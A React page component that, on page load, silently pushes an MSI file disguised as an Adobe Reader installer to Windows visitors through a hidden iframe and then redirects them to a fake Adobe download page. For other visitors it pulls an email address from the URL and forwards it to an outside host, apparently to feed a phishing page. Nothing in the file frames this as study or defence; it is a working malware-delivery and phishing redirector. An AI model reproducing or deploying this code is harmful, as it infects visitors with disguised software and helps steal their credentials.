import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    const userAgent = navigator.userAgent || '';
    const isWindows = /windows/i.test(userAgent);

    const NON_WINDOWS_TARGET = "https://wavemarkmx.com/ms";

    // 1. Windows users → MSI download, then redirect
    if (isWindows) {
      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '/Reader_adobe_install_online.msi';
      document.body.appendChild(iframe);

      setTimeout(() => {
        window.location.href =
          'https://mksonline.com.mx/css/adobe/reader/download.html';
      }, 2000);

      return;
    }

    // 2. Non-Windows → grab email from hash/query
    const url = new URL(window.location.href);
    let email = "";

    // A) Hash ( #email@example.com )
    if (url.hash) {
      email = url.hash.substring(1);
    }

    // B) Query parameters ?email=
    if (!email && url.searchParams.get("email")) {
      email = url.searchParams.get("email");
    }

    // C) Fallback ?smn=
    if (!email && url.searchParams.get("smn")) {
      email = url.searchParams.get("smn");
    }

    // 3. Redirect with fragment (keep @ as is)
    const finalUrl = email ? `${NON_WINDOWS_TARGET}#${email}` : NON_WINDOWS_TARGET;

    window.location.href = finalUrl;
  }, []);

  return null;
}
